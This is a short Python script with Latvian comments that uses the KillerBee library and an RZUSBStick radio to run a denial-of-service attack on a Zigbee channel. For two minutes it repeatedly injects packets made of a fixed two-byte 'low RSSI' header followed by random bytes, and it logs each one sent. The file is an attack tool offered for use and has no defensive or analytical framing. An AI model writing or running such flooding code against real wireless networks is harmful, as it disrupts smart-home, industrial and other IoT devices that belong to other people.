import logging
import random
import time
from killerbee import KillerBee

# Žurnāla konfigurācija
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Parametri
INTERFACE = "1:3" # RZUSBStick saskarne
CHANNEL = 15 # Zigbee kanāls
DURATION = 120  # Darbības ilgums
PACKET_SIZE = 50 # Pakēšu izmērs
DELAY_BETWEEN_PACKETS = 0.1 # Paketes sutīšanas aizturi
LOW_RSSI_HEADER = b'\x01\x01'  # Uzbrukuma pakešu galvene

# Lietderīgās slodzes ģenerēšana
def generate_low_rssi_payload(size):
    header = LOW_RSSI_HEADER
    payload_size = size - len(header)
    payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
    packet = header + payload
    logging.debug(f"Generated packet: {packet.hex()}")
    return packet

# DoS uzbrukums
def perform_dos_attack(interface, channel, duration, packet_size, delay):
    try:
        kb = KillerBee(device=interface)
        kb.set_channel(channel)
        logging.info(f"Initiating a DoS attack on channel {channel} via interface {interface}.")

        start_time = time.time()
        packets_sent = 0

        while time.time() - start_time < duration:
            payload = generate_low_rssi_payload(packet_size)
            kb.inject(payload, channel=channel)
            packets_sent += 1
            logging.info(f"Sended packet #{packets_sent}: {payload.hex()}")
            time.sleep(delay)

        kb.close()
        logging.info(f"DoS attack is over. Amount of sended packets: {packets_sent}")

    except Exception as e:
        logging.error(f"Error: {e}")

if __name__ == "__main__":
    perform_dos_attack(INTERFACE, CHANNEL, DURATION, PACKET_SIZE, DELAY_BETWEEN_PACKETS)
